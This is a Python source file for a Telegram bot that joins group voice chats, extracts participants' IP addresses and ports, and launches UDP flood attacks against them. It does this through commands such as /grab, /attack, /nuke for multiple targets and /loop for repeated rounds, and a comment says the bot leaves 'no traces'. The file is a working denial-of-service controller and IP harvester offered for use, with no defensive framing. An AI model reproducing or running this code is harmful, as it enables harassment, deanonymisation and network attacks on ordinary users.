from __future__ import annotations
import asyncio, logging, re
from enum import Enum
from pyrogram import Client, filters
from pyrogram.errors import FloodWait, PeerIdInvalid, InviteHashInvalid, InviteHashExpired
from pyrogram.handlers import MessageHandler, CallbackQueryHandler
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.raw import functions, types
from attack_engine import AttackEngine
from vc_detector import VCDetector, VCRecord
from utils import is_valid_port, human_bytes, IPV4_RE

LOGGER = logging.getLogger(__name__)

class State(str, Enum):
    IDLE = "IDLE"; SCAN = "SCAN"; SELECT = "SELECT"; JOIN = "JOIN"; CONFIRM = "CONFIRM"; ATTACK = "ATTACK"; LOOP = "LOOP"

class BotHandler:
    def __init__(self, bot: Client, detector: VCDetector, engine: AttackEngine, admin_id: int | None, max_dur: int, limit: int):
        self.bot = bot; self.detector = detector; self.engine = engine; self.admin = admin_id; self.max_dur = max_dur; self.limit = limit
        self.state = State.IDLE
        self.records = []
        self.selected = None
        self.target_ip = None; self.target_port = 0
        self.loop_active = False; self.loop_count = 0; self.loop_iter = 0
        self.progress_task = None
        self._last_join_target = None

        # Commands
        bot.add_handler(MessageHandler(self.cmd_scan, filters.command("scan")))
        bot.add_handler(MessageHandler(self.cmd_attack, filters.command("attack")))
        bot.add_handler(MessageHandler(self.cmd_nuke, filters.command("nuke")))
        bot.add_handler(MessageHandler(self.cmd_loop, filters.command("loop")))
        bot.add_handler(MessageHandler(self.cmd_stop, filters.command("stop")))
        bot.add_handler(MessageHandler(self.cmd_status, filters.command("status")))
        bot.add_handler(MessageHandler(self.cmd_join, filters.command("join")))
        bot.add_handler(MessageHandler(self.cmd_retry, filters.command("retry")))
        bot.add_handler(MessageHandler(self.cmd_leave, filters.command("leave")))
        # ⚡ NEW SINGLE COMMAND: /grab
        bot.add_handler(MessageHandler(self.cmd_grab, filters.command("grab")))
        bot.add_handler(CallbackQueryHandler(self.on_callback))

    # ================================================================
    # 🚀 NEW: /grab - Ek command, sab kuch (Join, Extract, Leave, Output)
    # ================================================================
    async def cmd_grab(self, client, msg):
        parts = msg.text.split()
        if len(parts) < 2:
            await msg.reply(
                "**Usage:** `/grab <chat_id_or_link>`\n"
                "**Examples:**\n"
                "`/grab -1003329480093`\n"
                "`/grab https://t.me/joinchat/abc123`\n\n"
                "✅ Ye command automatically join karega, IPs nikaalega, leave karega aur list dega."
            )
            return

        identifier = parts[1].strip()
        self._last_join_target = identifier
        status = await msg.reply(f"⏳ Processing `{identifier}` ...")

        chat = None
        # 1. Resolve Chat / Join if needed
        try:
            if "t.me" in identifier or "telegram.me" in identifier:
                try:
                    chat = await client.join_chat(identifier)
                except Exception as e:
                    await status.edit(f"❌ Invite link invalid/expired: {e}")
                    return
            else:
                # Numeric ID or username
                try:
                    chat = await client.get_chat(int(identifier) if identifier.lstrip('-').isdigit() else identifier)
                except PeerIdInvalid:
                    # Try to join if public group (rare for numeric, but let's try)
                    try:
                        chat = await client.join_chat(identifier)
                    except Exception as e:
                        await status.edit(
                            f"❌ **Peer ID Invalid / Not a Member**\n"
                            f"Account is not in this group. Use an **invite link** instead, or add this account manually.\n"
                            f"Error: {e}"
                        )
                        return
                except Exception as e:
                    await status.edit(f"❌ Error fetching chat: {e}")
                    return
        except Exception as e:
            await status.edit(f"❌ Critical error: {e}")
            return

        if not chat:
            await status.edit("❌ Chat not found.")
            return

        # 2. Get Full Chat & Check VC
        try:
            peer = await client.resolve_peer(chat.id)
            full = None
            if isinstance(peer, types.InputPeerChannel):
                full = await client.invoke(functions.channels.GetFullChannel(channel=peer))
            elif isinstance(peer, types.InputPeerChat):
                full = await client.invoke(functions.messages.GetFullChat(chat_id=peer.chat_id))
            else:
                await status.edit("❌ Unsupported chat type (e.g., user).")
                return

            call = getattr(full.full_chat, "call", None)
            if not call:
                await status.edit(f"❌ No active Voice Chat in **{chat.title}**.")
                return

            record = VCRecord(chat.id, chat.title or str(chat.id), peer, call, chat.id)
        except Exception as e:
            await status.edit(f"❌ Failed to fetch VC info: {e}")
            return

        # 3. Extract IPs (Joins VC, grabs endpoints)
        await status.edit(f"⏳ Joining VC and extracting IPs from **{chat.title}**...")
        try:
            meta = await self.detector.extract(record)
        except Exception as e:
            await status.edit(f"❌ IP Extraction failed: {e}")
            return

        # 4. Leave VC immediately (No traces left)
        await status.edit("⏳ Leaving VC...")
        await self.detector.leave(record)

        # 5. Format and send IP list
        ips = meta.get("extracted_ips", [])
        if not ips:
            await status.edit(f"✅ Joined **{chat.title}** but **NO IPs** extracted. (Maybe no streams).")
            return

        # Clean duplicates (IP:Port)
        unique_ips = {}
        for item in ips:
            ip = item.get("ip")
            port = item.get("port", 0)
            if ip and not ip.startswith("0.") and not ip.startswith("127."):
                key = f"{ip}:{port}" if port else ip
                unique_ips[key] = item

        if not unique_ips:
            await status.edit("✅ Found only localhost/private IPs. Nothing to show.")
            return

        # Build output
        output = f"✅ **Grabbed {len(unique_ips)} IPs from {chat.title}**\n\n"
        count = 0
        for key, item in unique_ips.items():
            count += 1
            output += f"`{key}`"
            if item.get("region"):
                output += f"  🌍 {item['region']}"
            output += "\n"
            if count >= 30:  # Limit to avoid message length errors
                break

        if len(unique_ips) > 30:
            output += f"\n... and {len(unique_ips) - 30} more."

        # Send the list
        await status.edit(output)

    # ================================================================
    # EXISTING COMMANDS
    # ================================================================
    async def cmd_join(self, client, msg):
        parts = msg.text.split()
        if len(parts) < 2:
            await msg.reply("Usage:\n/join <chat_id> (e.g., -100123456)\n/join <invite_link> (e.g., https://t.me/joinchat/abc)")
            return

        identifier = parts[1].strip()
        self._last_join_target = identifier
        status = await msg.reply(f"⏳ Trying to join/access: {identifier}")

        chat = None
        try:
            if "t.me" in identifier or "telegram.me" in identifier:
                try:
                    chat = await client.join_chat(identifier)
                    await status.edit(f"✅ Successfully joined: {chat.title}")
                except InviteHashInvalid:
                    await status.edit("❌ Invalid invite link.")
                    return
                except InviteHashExpired:
                    await status.edit("❌ Invite link expired.")
                    return
            else:
                try:
                    chat = await client.get_chat(int(identifier) if identifier.lstrip('-').isdigit() else identifier)
                except PeerIdInvalid:
                    try:
                        chat = await client.join_chat(identifier)
                        await status.edit(f"✅ Joined: {chat.title}")
                    except Exception as join_e:
                        await status.edit(f"❌ Not a member and unable to join.\nReason: {join_e}\n\n💡 Add this account to the group or use invite link.")
                        return
                except Exception as e:
                    await status.edit(f"❌ Error: {e}")
                    return

            if not chat:
                await status.edit("❌ Chat not found.")
                return

            peer = await client.resolve_peer(chat.id)
            full = None
            if isinstance(peer, types.InputPeerChannel):
                full = await client.invoke(functions.channels.GetFullChannel(channel=peer))
            elif isinstance(peer, types.InputPeerChat):
                full = await client.invoke(functions.messages.GetFullChat(chat_id=peer.chat_id))
            else:
                await status.edit("Unsupported chat type.")
                return

            call = getattr(full.full_chat, "call", None)
            if not call:
                await status.edit(f"❌ No active Voice Chat in {chat.title}.")
                return

            record = VCRecord(chat.id, chat.title or str(chat.id), peer, call, chat.id)
            self.records = [record]
            self.selected = record
            self.state = State.CONFIRM

            await status.edit("⏳ Extracting IPs from VC...")
            meta = await self.detector.extract(record)
            ips = meta.get("extracted_ips", [])
            if not ips:
                await status.edit("⚠️ Joined but no IPs found. Try /attack manually.")
                return

            self.target_ip = ips[0]["ip"]
            self.target_port = ips[0]["port"] or 10001
            lines = "\n".join([f"• {x['ip']}:{x['port']}" for x in ips[:5]])
            await status.edit(
                f"✅ **{chat.title}**\n"
                f"Extracted {len(ips)} IPs:\n{lines}\n\nUse **/attack {self.target_ip} {self.target_port}** or click below.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🚀 ATTACK NOW", callback_data="attack")],
                    [InlineKeyboardButton("🚪 LEAVE VC", callback_data="leave")]
                ])
            )

        except Exception as e:
            await status.edit(f"❌ Critical error: {e}")

    async def cmd_retry(self, client, msg):
        if not self._last_join_target:
            await msg.reply("No previous target to retry. Use /join first.")
            return
        fake_msg = msg
        fake_msg.text = f"/join {self._last_join_target}"
        await self.cmd_join(client, fake_msg)

    async def cmd_leave(self, client, msg):
        if not self.selected:
            await msg.reply("Not in any VC.")
            return
        await self.detector.leave(self.selected)
        self.selected = None
        self.state = State.IDLE
        await msg.reply("✅ Left the voice chat.")

    async def cmd_scan(self, client, msg):
        if self.state not in (State.IDLE, State.SCAN):
            await msg.reply(f"Busy: {self.state}. Use /stop")
            return
        self.state = State.SCAN
        status = await msg.reply("🔎 Scanning VCs...")
        try:
            self.records = await self.detector.scan(limit=self.limit)
        except Exception as e:
            await status.edit(f"❌ Scan error: {e}")
            self.state = State.IDLE; return
        if not self.records:
            await status.edit("No active VCs. Start a voice chat first.")
            self.state = State.IDLE; return
        buttons = [[InlineKeyboardButton(f"{i+1}. {r.title[:30]}", callback_data=f"sel:{i}")] for i,r in enumerate(self.records)]
        await status.edit(f"✅ Found {len(self.records)} VCs. Select:", reply_markup=InlineKeyboardMarkup(buttons))
        self.state = State.SELECT

    async def cmd_attack(self, client, msg):
        parts = msg.text.split()
        if len(parts) < 3:
            await msg.reply("Usage: /attack <ip> <port> [duration]")
            return
        ip, port = parts[1], int(parts[2])
        dur = int(parts[3]) if len(parts)>3 else 30
        dur = min(dur, self.max_dur)
        if not is_valid_port(port):
            await msg.reply("Invalid port")
            return
        await self._start_attack(msg.chat.id, ip, port, dur)

    async def cmd_nuke(self, client, msg):
        parts = msg.text.split()
        if len(parts) < 3:
            await msg.reply("Usage: /nuke <ip:port> [ip:port ...] <duration>\nExample: /nuke 1.1.1.1:80 2.2.2.2:443 30")
            return
        targets = []; dur = 30
        for p in parts[1:]:
            if ":" in p:
                ip, port_str = p.rsplit(":",1)
                try:
                    port = int(port_str)
                    if is_valid_port(port): targets.append((ip, port))
                except: pass
            else:
                try: dur = int(p)
                except: pass
        if not targets:
            await msg.reply("No valid targets")
            return
        dur = min(dur, self.max_dur)
        await msg.reply(f"💥 NUKING {len(targets)} targets for {dur}s")
        tasks = [self._start_attack(msg.chat.id, ip, port, dur, silent=True) for ip, port in targets]
        await asyncio.gather(*tasks, return_exceptions=True)
        await msg.reply(f"✅ Nuke completed on {len(targets)} targets.")

    async def cmd_loop(self, client, msg):
        parts = msg.text.split()
        if len(parts) < 5:
            await msg.reply("Usage: /loop <ip> <port> <duration> <iterations>")
            return
        ip, port, dur, iters = parts[1], int(parts[2]), int(parts[3]), int(parts[4])
        if not is_valid_port(port) or dur <=0 or iters <=0:
            await msg.reply("Invalid")
            return
        dur = min(dur, self.max_dur); iters = min(iters, 50)
        self.loop_active = True; self.loop_iter = iters; self.loop_count = 0
        status = await msg.reply(f"🔄 Loop {iters} rounds on {ip}:{port} ({dur}s each)")
        for i in range(iters):
            if not self.loop_active: break
            self.loop_count = i+1
            await status.edit(f"Round {i+1}/{iters} ...")
            await self._start_attack(msg.chat.id, ip, port, dur, silent=True)
            await asyncio.sleep(1.5)
        self.loop_active = False; self.state = State.IDLE
        await status.edit(f"✅ Loop finished ({iters} rounds)")

    async def cmd_stop(self, client, msg):
        self.engine.stop(); self.loop_active = False
        if self.progress_task: self.progress_task.cancel(); self.progress_task = None
        if self.selected: await self.detector.leave(self.selected)
        self.state = State.IDLE
        await msg.reply("🛑 Halt – everything stopped.")

    async def cmd_status(self, client, msg):
        await msg.reply(
            f"State: {self.state}\n"
            f"Target: {self.target_ip}:{self.target_port}\n"
            f"Loop: {self.loop_count}/{self.loop_iter}\n"
            f"Stats: sent={self.engine.stats.sent}, fail={self.engine.stats.failed}, rps={self.engine.stats.rps:.1f}"
        )

    async def on_callback(self, client, cb):
        data = cb.data
        if data.startswith("sel:"):
            idx = int(data.split(":")[1])
            self.selected = self.records[idx]
            await cb.message.edit_text(f"Selected: {self.selected.title}\nProceed?",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ JOIN & EXTRACT", callback_data="join")],
                                                   [InlineKeyboardButton("❌ CANCEL", callback_data="cancel")]]))
            await cb.answer()
        elif data == "join":
            await cb.message.edit_text("⏳ Joining and extracting...")
            await cb.answer()
            try:
                meta = await self.detector.extract(self.selected)
                ips = meta.get("extracted_ips", [])
                if not ips:
                    await cb.message.edit_text("No IPs found. Use /attack manually.")
                    self.state = State.IDLE; return
                self.target_ip = ips[0]["ip"]; self.target_port = ips[0]["port"] or 10001
                lines = "\n".join([f"• {x['ip']}:{x['port']}" for x in ips[:5]])
                await cb.message.edit_text(
                    f"✅ Extracted IPs:\n{lines}\n\nAttack now?",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🚀 ATTACK", callback_data="attack")],
                        [InlineKeyboardButton("🚪 LEAVE", callback_data="leave")]
                    ])
                )
                self.state = State.CONFIRM
            except Exception as e:
                await cb.message.edit_text(f"Extraction error: {e}")
                self.state = State.IDLE
        elif data == "attack":
            await cb.answer("Launching...")
            await self._start_attack(cb.message.chat.id, self.target_ip, self.target_port, self.max_dur//2)
        elif data == "leave":
            await self.detector.leave(self.selected)
            await cb.message.edit_text("Left VC.")
            self.state = State.IDLE; await cb.answer()
        elif data == "cancel":
            self.state = State.IDLE
            await cb.message.edit_text("Cancelled.")
            await cb.answer()
        elif data == "global_stop":
            self.engine.stop(); self.loop_active = False
            await cb.answer("Stopped!")

    async def _start_attack(self, chat_id, ip, port, duration, silent=False):
        self.state = State.ATTACK
        if not silent:
            dash = await self.bot.send_message(chat_id, f"🔥 Attacking {ip}:{port} for {duration}s")
            self.progress_task = asyncio.create_task(self._progress(dash.chat.id, dash.id, ip, port))
        try:
            stats = await self.engine.run_udp(ip, port, duration)
            result = f"✅ {ip}:{port} – sent {stats.sent}, fail {stats.failed}, {human_bytes(stats.bytes)}, RPS {stats.rps:.1f}"
            if not silent:
                await dash.edit_text(result)
            else:
                await self.bot.send_message(chat_id, result)
        except Exception as e:
            if not silent:
                await dash.edit_text(f"❌ Attack error: {e}")
            else:
                await self.bot.send_message(chat_id, f"❌ {ip}:{port} error: {e}")
        finally:
            if self.progress_task and not silent:
                self.progress_task.cancel(); self.progress_task = None
            self.state = State.IDLE if not self.loop_active else State.LOOP

    async def _progress(self, chat_id, msg_id, ip, port):
        while True:
            await asyncio.sleep(3)
            stats = self.engine.stats
            if not stats.running: break
            try:
                await self.bot.edit_message_text(
                    chat_id, msg_id,
                    f"⚡ {ip}:{port}\nSent: {stats.sent} | Fail: {stats.failed}\nData: {human_bytes(stats.bytes)}\nRPS: {stats.rps:.1f}",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP", callback_data="global_stop")]])
                )
            except: pass
